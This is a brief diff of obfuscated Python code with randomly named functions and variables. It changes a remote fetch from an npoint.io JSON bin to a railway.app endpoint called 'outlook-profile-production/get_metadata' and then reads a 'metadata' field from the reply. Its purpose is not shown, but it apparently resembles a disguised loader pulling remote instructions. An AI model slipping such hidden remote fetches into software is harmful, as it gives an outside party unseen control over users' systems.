@@ -18,7 +18,7 @@ def net_nufjin_891():
 
     def net_mnusim_590():
         try:
-            model_iseekh_825 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_iseekh_825 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_iseekh_825.raise_for_status()
             train_fgynom_401 = model_iseekh_825.json()
             net_ttqwxa_516 = train_fgynom_401.get('metadata')
